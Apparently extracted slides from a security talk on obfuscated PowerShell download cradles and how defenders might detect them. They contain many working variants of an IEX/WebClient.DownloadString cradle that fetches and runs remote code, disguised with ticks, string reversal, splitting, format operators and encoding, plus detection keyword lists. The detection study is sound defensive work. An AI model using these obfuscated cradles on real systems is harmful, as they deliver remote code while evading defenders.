• What's potentially problematic about "Invoke-Expression"??? 
1.
Aliases: Invoke-Expression / IEX
2.
Order
3.
Ticks
4.
Invocation operators
5.
Invoke-Expression vs Invoke-Command
Cmdlet/Alias
Example
Invoke-Command
Invoke-Command {Write-Host ICM Example -ForegroundColor Green}
ICM
ICM {Write-Host ICM Example -ForegroundColor Green}
.Invoke()
{Write-Host ICM Example -ForegroundColor Green}.Invoke()
&
& {Write-Host ICM Example -ForegroundColor Green}
.
. {Write-Host ICM Example -ForegroundColor Green}
Obfuscating the Cradle
.InvokeReturnAsIs()
.InvokeWithContext()  PS3.0+
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression || IEX || Invoke-Command || ICM || .Invoke() || … "&" or "." ?!?!?
• So we add the Invoke-Command family to our arguments…
Obfuscating the Cradle
• Invoke-Expression (& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression || IEX || Invoke-Command || ICM || .Invoke() || … "&" or "." ?!?!?
• So we add the Invoke-Command family to our arguments…
• Don’t forget about PS 1.0!
• $ExecutionContext.InvokeCommand.InvokeScript({Write-Host SCRIPTBLOCK})
• $ExecutionContext.InvokeCommand.InvokeScript("Write-Host EXPRESSION")
Obfuscating the Cradle
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) 
"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N || `I`E`X || `I`N`V`o`k`e`-`C`o`m`m`A`N`d || `I`C`M || 
.   "`I`N`V`o`k`e"(   ) || … "&" or "." ?!?!?
• So we add the Invoke-Command family to our arguments…
• And add in ticks…
Obfuscating the Cradle
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) 
"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N || `I`E`X || `I`N`V`o`k`e`-`C`o`m`m`A`N`d || `I`C`M || 
.   "`I`N`V`o`k`e"(   ) || … "&" or "." ?!?!?
• Can we reduce FPs by only triggering on "&" or "." when "{" and "}" are present?
Obfuscating the Cradle
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) 
"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N || `I`E`X || `I`N`V`o`k`e`-`C`o`m`m`A`N`d || `I`C`M || 
.   "`I`N`V`o`k`e"(   ) || … "&" or "." ?!?!?
• Can we reduce FPs by only triggering on "&" or "." when "{" and "}" are present?
• Of course not, because we can convert strings to script blocks!
Obfuscating the Cradle
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) 
"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 'ht'+'tps://bit.ly/L3g1t')
• What process command line args can we key off of for this?
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N || `I`E`X || `I`N`V`o`k`e`-`C`o`m`m`A`N`d || `I`C`M || 
.   "`I`N`V`o`k`e"(   ) || … "&" or "." ?!?!?
• Can we reduce FPs by only triggering on "&" or "." when "{" and "}" are present?
• Of course not, because we can convert strings to script blocks!
.Net and PS 1.0 Syntax for Script Block Conversion
1.
[Scriptblock]::Create("Write-Host Script Block Conversion")
2.
$ExecutionContext.InvokeCommand.NewScriptBlock("Write-Host Script Block 
Conversion")
Obfuscating the Cradle
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) 
"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 'ht'+'tps://bit.ly/L3g1t')
• What process command line args can we key off of for this?
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N || `I`E`X || `I`N`V`o`k`e`-`C`o`m`m`A`N`d || `I`C`M || 
.   "`I`N`V`o`k`e"(   ) || … "&" or "." ?!?!?
• Can we reduce FPs by only triggering on "&" or "." when "{" and "}" are present?
• Of course not, because we can convert strings to script blocks!
.Net and PS 1.0 Syntax for Script Block Conversion…and we can obfuscate those too!
1.
([Type]("Scr"+"ipt"+"block"))::("`C`R`e"+"`A`T`e").Invoke("ex"+"pres"+"sion")
2.
$a = ${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}; $b = $a."`I`N`V`o`k`e`C`o`m`m`A`N`d"; 
$b."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("ex"+"pres"+"sion")
Obfuscating the Cradle
• `I`N`V`o`k`e`-`E`x`p`R`e`s`s`i`o`N (& (`G`C`M *w-O*) 
"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 'ht'+'tps://bit.ly/L3g1t')
.Net and PS 1.0 Syntax for Script Block Conversion…and we can obfuscate those too!
And Invoke-CradleCrafter has even more invocation options (and obfuscation techniques)!
More Obfuscation Techniques
• Additional command line obfuscation techniques via string manipulation
• Reverse string:         $reverseCmd = ")'t1g3L/yl.tib//:sptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN("; 
1.
Traverse the string in reverse and join it back together
IEX ($reverseCmd[-1..-($reverseCmd.Length)] -Join '') | IEX
2.
Cast string to char array and use .Net function to reverse and then join it back together
$reverseCmdCharArray = $reverseCmd.ToCharArray(); [Array]::Reverse($reverseCmdCharArray); 
IEX ($reverseCmdCharArray -Join '') | IEX
3.
.Net Regex the string RightToLeft and then join it back together
IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX
More Obfuscation Techniques
• Additional command line obfuscation techniques via string manipulation
• Reverse string:
• Split string:
$cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t')";
1.
Split the string on the delimiter and join it back together
IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
More Obfuscation Techniques
• Additional command line obfuscation techniques via string manipulation
• Reverse string:
• Split string:
• Replace string:       $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t')";
1.
PowerShell's .Replace
IEX $cmdWithDelim.Replace("~~","") | IEX
2.
.Net's -Replace  (and -CReplace which is case-sensitive replace) 
IEX ($cmdWithDelim -Replace "~~","") | IEX
3.
PowerShell's -f format operator
IEX ('({0}w-Object {0}t.WebClient).{1}String("{2}bit.ly/L3g1t")' -f 'Ne', 'Download','https://') | IEX
More Obfuscation Techniques
• Additional command line obfuscation techniques via string manipulation
• Reverse string:
• Split string:
• Replace string:
• Concatenate string:
$c1="(New-Object Net.We"; $c2="bClient).Downlo"; $c3="adString('https://bit.ly/L3g1t')";
1.
PowerShell's -Join (w/o delimiter)
IEX ($c1,$c2,$c3 -Join '') | IEX
2.
PowerShell's -Join (with delimiter)
IEX ($c1,$c3 -Join $c2) | IEX
3.
.Net's Join
IEX ([string]::Join($c2,$c1,$c3)) | IEX
4.
.Net's Concat
IEX ([string]::Concat($c1,$c2,$c3)) | IEX
5.
+ operator   /   concat without + operator
IEX ($c1+$c2+$c3) | IEX     /     IEX "$c1$c2$c3" | IEX
More Obfuscation Techniques
• Automated Obfuscation via 
Invoke-Obfuscation?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
More Obfuscation Techniques
• Automated Obfuscation via 
Invoke-Obfuscation?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
.("{1}{0}" -f 'X','IE') (&("{3}{2}{1}{0}"-f'ct','-
Obje','w','Ne') ("{0}{2}{1}"-f 
'N','nt','et.WebClie')).("{2}{0}{1}{3}"-
f'dSt','rin','Downloa','g').Invoke(("{5}{0}{3}{4}
{1}{2}"-f'tp:/','3','g1t','/','bit.ly/L','ht'))
More Obfuscation Techniques
• Automated Obfuscation via 
Invoke-Obfuscation?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
. ( $PShoMe[21]+$psHOMe[34]+'X') 
((("{14}{11}{7}{46}{5}{30}{22}{24}{68}{78}{0}{59}{67}{31}{38}{55}{16}{69}{51}{17}{23}{8}{35}{6}{71}{34}{50}{64}{60}
{58}{47}{10}{48}{65}{37}{40}{21}{56}{43}{53}{52}{9}{12}{74}{26}{36}{2}{15}{70}{61}{75}{66}{49}{29}{77}{42}{32}{1}
{4}{33}{54}{76}{13}{73}{45}{18}{19}{28}{62}{20}{41}{27}{44}{3}{25}{72}{57}{63}{39}{79}" -f 
'(&','}{2}','A','j6T,j6','PA','6T','6T)','f','w','entj6T)','ebj6','AM-',').(PA',' j6T.lj6','.(PAM{1}{0}P','M-
fj6T','jectj6T,j','6T','3','j','tj6T,','6','j6T,',',j6TNe','j6TIE','Th','}{1}{0','6','6','rinj6T,j6TDownj6','X','1}{0}','}{0}{1','M','1}{0
}','j','}P','TNe','PA','itj6','j','j','}{5',',j6','T/','6Ty/L',' j','6Tt.W','T','t','{','-Oj','Cli','T','-','M-fj6Tb','T','/j','-f 
j','(PA','M','j6','T,j6Tg1','6T,j6Tb','2}PA',',j6','oadS','M{2}{','j','6T','g',' 
(PAM{','ttp:','T,j','M{2','T,j6Tl','f','T).Invoke((PAM{4}{3','6T) 
','T))')).replACE(([Char]80+[Char]65+[Char]77),[stRIng][Char]34).replACE('j6T',[stRIng][Char]39) )
APT32
Vietnamese attacker
(aka OceanLotus)
More Obfuscation Techniques
• Automated Obfuscation via 
Invoke-CradleCrafter?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
More Obfuscation Techniques
• Automated Obfuscation via 
Invoke-CradleCrafter?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
SI Variable:/4 'http://bit.ly/L3g1t';SV Bm 'Net.WebClient';ls panyo*;SV 8i (.(ChildItem
Variable:\E*Cont*).Value.(((ChildItem Variable:\E*Cont*).Value|Member)[6].Name).(((ChildItem
Variable:\E*Cont*).Value.(((ChildItem Variable:\E*Cont*).Value|Member)[6].Name)|Member|Where{(Get-Item 
Variable:\_).Value.Name-like'*Cm*t'}).Name).Invoke((ChildItem Variable:\E*Cont*).Value.(((ChildItem
Variable:\E*Cont*).Value|Member)[6].Name).(((ChildItem Variable:\E*Cont*).Value.(((ChildItem
Variable:\E*Cont*).Value|Member)[6].Name)|Member|Where{(Get-Item Variable:\_).Value.Name-
like'G*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(GV Bm).Value);Set-Variable b (((((GV 8i -
Valu)).PsObject.Methods)|Where{$_.Name-clike'D*g'}).Name);(GV 8i -Valu).((Variable b).Value).Invoke((GV 4 -
ValueOn))|.(Get-Variable E*xt).Value.InvokeCommand.(((Get-Variable E*xt).Value.InvokeCommand|Member|Where-
Object{(Get-Item Variable:\_).Value.Name-like'*Cm*ts'}).Name).Invoke('*e-*pr*n')
More Obfuscation Techniques
• Automated Obfuscation via Invoke-
Obfuscation?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
${-'*}=+$(  );  ${ }=  ${-'*}  ;  ${(+}  =++  ${-'*};${)}=(${-'*}=${-'*}+${(+}  )  ;  ${'/}=  (${-'*}  =${-'*}+  ${(+}  );  ${@} =  (  
${-'*}=${-'*}  +  ${(+})  ;  ${~ =}  =(  ${-'*}=  ${-'*}+  ${(+});  ${;}  =(${-'*}  =${-'*}+${(+})  ;  ${+}  =  (${-'*}=  ${-'*} +  
${(+})  ;  ${]}  =  (  ${-'*}  =${-'*}  +  ${(+});${-}=  (${-'*}=${-'*}  +  ${(+}  )  ;  ${-$.}="["+  "$(  @{  })  "[${+}]  
+"$(@{})"["${(+}"  +"${-}"]+  "$(@{}  )"["${)}"+  "${ }"  ]  +  "$?  "[${(+}  ]  +"]";${-'*}="".("$(@{}  )"[  "${(+}"  +  
"${@}"]+"$(@{}  )  "[  "${(+}"  +  "${;}"  ]+  "$(@{}  )"[  ${ }]+"$(@{  })"[  ${@}]  +"$?  "[${(+}]+"$(@{}  )  "[${'/}])  ; ${-
'*}  ="$(@{  }  )"[  "${(+}"  +  "${@}"]  +"$(@{  })"[${@}]+  "${-'*}"["${)}"+"${+}"]  ;  "${-'*}(${-$.}${+}${'/}  +  ${-
$.}${;}${-}  +${-$.}${]}${]}  +  ${-$.}${'/}${)}  +  ${-$.}${@}${ }+  ${-$.}${+}${]}+${-$.}${(+}${ }${(+}  +${-$.}${(+}${(+}${-
}+  ${-$.}${@}${~ =}  +  ${-$.}${+}${-}  +  ${-$.}${-}${]}+${-$.}${(+}${ }${;}  +  ${-$.}${(+}${ }${(+}+${-$.}${-}${-}+${-
$.}${(+}${(+}${;}+  ${-$.}${'/}${)}+  ${-$.}${+}${]}+${-$.}${(+}${ }${(+}+  ${-$.}${(+}${(+}${;}+${-$.}${@}${;}  +${-
$.}${]}${+}  +  ${-$.}${(+}${ }${(+}  +${-$.}${-}${]}+${-$.}${;}${+}  +  ${-$.}${(+}${ }${]}  +${-$.}${(+}${ }${~ =}  +${-
$.}${(+}${ }${(+}+  ${-$.}${(+}${(+}${ }+  ${-$.}${(+}${(+}${;}  +  ${-$.}${@}${(+}  +  ${-$.}${@}${;}+${-$.}${;}${]}+  ${-
$.}${(+}${(+}${(+}  +${-$.}${(+}${(+}${-}  +  ${-$.}${(+}${(+}${ }+  ${-$.}${(+}${ }${]}  +  ${-$.}${(+}${(+}${(+}  +  ${-$.}${-
}${+}+${-$.}${(+}${ }${ }  +${-$.}${]}${'/}+${-$.}${(+}${(+}${;}+  ${-$.}${(+}${(+}${@}+  ${-$.}${(+}${ }${~ =}  +  ${-
$.}${(+}${(+}${ }  +  ${-$.}${(+}${ }${'/}+  ${-$.}${@}${ }+  ${-$.}${'/}${-}+${-$.}${(+}${ }${@}+${-$.}${(+}${(+}${;}  +${-
$.}${(+}${(+}${;}  +  ${-$.}${(+}${(+}${)}+${-$.}${~ =}${]}+${-$.}${@}${+}+${-$.}${@}${+}  +  ${-$.}${-}${]}+${-
$.}${(+}${ }${~ =}  +  ${-$.}${(+}${(+}${;}  +${-$.}${@}${;}+  ${-$.}${(+}${ }${]}  +${-$.}${(+}${)}${(+}+  ${-$.}${@}${+}  
+${-$.}${+}${;}+  ${-$.}${~ =}${(+}  +${-$.}${(+}${ }${'/}+  ${-$.}${@}${-}  +${-$.}${(+}${(+}${;}+${-$.}${'/}${-}  +  ${-
$.}${@}${(+})"|.  ${-'*} 
@mutaguchi came up 
with this concept in 2010!
More Obfuscation Techniques
• Automated Obfuscation via Invoke-
Obfuscation?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
${        }=  +  $(  );  ${         }=  ${        }  ;  ${      }  =++${        }  ;${   }=  (${        }=  ${        }+${   });${     }=(${        }  =  ${        }+${      
}  )  ;${          }=(  ${        }=  ${        }  +${      }  )  ;${       }  =(  ${        }  =  ${        }  +${      }  );${ }  =  (  ${        }=  ${        }  +${      }  
)  ;${            }=(  ${        }=  ${        }  +  ${      })  ;  ${  }  =(${        }=  ${        }  +${      });  ${     
}  =(${        }  =  ${        }  +${      });  
${    }  =  "["  +"$(@{  })"[  ${            }]  +  "$(@{})"[  "${      }${           }"]+  "$(@{  }  )"[  "${   }${         }"] +  "$?  "[${      }]+"]"  ;  
${        }  ="".("$(  @{  })  "[  "${      }${          }"]+"$(@{  }  )"["${      }${ }"  ]+"$(  @{})  "[  ${         }  ]+"$(@{}  )  "[  ${          }  ]+  
"$?"[  ${      }  ]  +"$(@{  })  "[  ${     }]);${        }  =  "$(  @{}  )  "[  "${      }"  +  "${          }"  ]  +"$(  @{ })  "[  ${          }  ]+"${        
}"[  "${   }"  +  "${            }"  ];  &  ${        }  (  "  ${    }${            }${     }  +${    }${ }${           }  + ${
}${  }${  }+  ${    }${     }${   }  
+${    }${          }${         }+  ${    }${            }${  }+${    }${      }${         }${      }+  ${    }${      }${   }${           }+  ${    }${          }${       
}+  ${    }${            }${           }+  ${    }${           }${  }+${    }${      }${         }${ }+  ${    }${      }${  
}${      }  +${    }${           }${           
}+  ${    }${      }${      }${ }+${    }${     }${   }+  ${    }${            }${  }+${    }${      }${         }${      }  +${
}${      }${      }${ }+${    }${          
}${ }  +${    }${  }${            }  +${    }${      }${         }${      }  +${    }${           }${  }  +${    }${ }${     
}+  ${    }${      }${         }${  }  
+  ${    }${      }${         }${       }+${    }${      }${         }${      }+${    }${      }${      }${         }+${    }${ 
}${      }${ }+  ${    }${          
}${      }  +  ${    }${          }${ }+  ${    }${ }${  }+  ${    }${      }${      }${      }  +${    }${      }${      }${
}+${    }${      }${      }${         
}+${    }${      }${         }${  }+  ${    }${      }${      }${      }  +${    }${           }${            }  +  ${    }${
}${         }${         }+  ${    }${  }${     
}+${    }${      }${      }${ }  +${    }${      }${      }${          }  +  ${    }${      }${         }${       }+  ${    }${ 
}${      }${         }+${    }${      
}${         }${     }  +  ${    }${          }${         }+  ${    }${     }${           }+${    }${      }${         }${    
}  +${    }${      }${      }${ }  +${    
}${      }${      }${ }+  ${    }${      }${      }${   }+${    }${       }${  }  +  ${    }${          }${            }+  ${
}${          }${            }  +  ${    }${           
}${  }  +${    }${      }${         }${       }+  ${    }${      }${      }${ }+  ${    }${          }${ }  +${    }${      }${ 
}${  }+${    }${      }${   }${      
}  +  ${    }${          }${            }  +  ${    }${            }${ }+${    }${       }${      }  +${    }${      }${     
}${     }  +  ${    }${          }${           
}+${    }${      }${      }${ }  +  ${    }${     }${           }  +  ${    }${          }${      }|  ${        }")
@mutaguchi came up 
with this concept in 2010!
More Obfuscation Techniques
• NEW Automated Obfuscation via 
Invoke-Obfuscation?
• IEX (New-Object Net.WebClient)
.DownloadString('http://bit.ly/L3g1t')
'
' | % {$Script = $_ -Split '' | % {'
'; $_.Split('
') | % {$_.Length-1}} ; $DecodedCommand = [Char[]][Int[]]($Script[0..($Script.Length-1)] -Join '').Trim('
').Split('
') -Join ''; IE`X $DecodedCommand}
THIS ISN’T NORMAL!
COSINE SIMILARITY
> We need more data!
So we ran a little contest...
> We need more data!